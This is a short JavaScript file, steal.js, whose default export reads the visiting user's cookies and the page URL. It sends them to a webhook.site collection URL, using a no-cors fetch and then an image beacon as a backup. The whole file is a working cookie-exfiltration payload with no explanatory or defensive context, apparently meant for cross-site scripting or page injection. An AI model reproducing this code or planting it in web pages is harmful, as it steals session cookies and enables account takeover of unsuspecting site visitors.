// steal.js
export default function() {
    const cookie = document.cookie || "";
    const url = document.location.href;

    // Send cookies + other info
    fetch(`https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}&origin=${encodeURIComponent(location.origin)}`, {
        method: 'GET',
        mode: 'no-cors'
    }).catch(() => {});

    // Extra backup (in case fetch is blocked)
    new Image().src = `https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}`;
}
